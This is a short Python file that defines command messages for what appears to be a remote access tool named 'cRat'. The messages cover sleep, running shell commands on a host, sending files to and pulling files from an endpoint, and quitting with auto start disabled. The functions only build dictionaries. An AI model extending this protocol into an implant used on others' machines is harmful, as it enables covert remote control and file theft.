
def Sleep(seconds):
    # return dict
    return { "operation":"sleep", "seconds":seconds }

def Run(command_id, command, async=False):
    # execute a shell command on the host
    return { "operation":"run", "id":command_id, "command":command , "async":async}

def Download(command_id, path):
    # Send file to endpoint - resume capable
    ## path - The path on the endpoint to write the data
    return { "operation":"download", "id":command_id, "path":path }

def Upload(command_id, path, position):
    # upload file from endpoint to server
    ## path - The path on the endpoint to read the data from
    ## position - The position in the file to start reading data. This is used to send data over multiple upload instructions.
    return { "operation":"upload", "id":command_id, "path":path, "position":position }

def Quit():
    # tells the endpoint to close the cRat executable and disable auto start.
    return { "operation":"quit" }
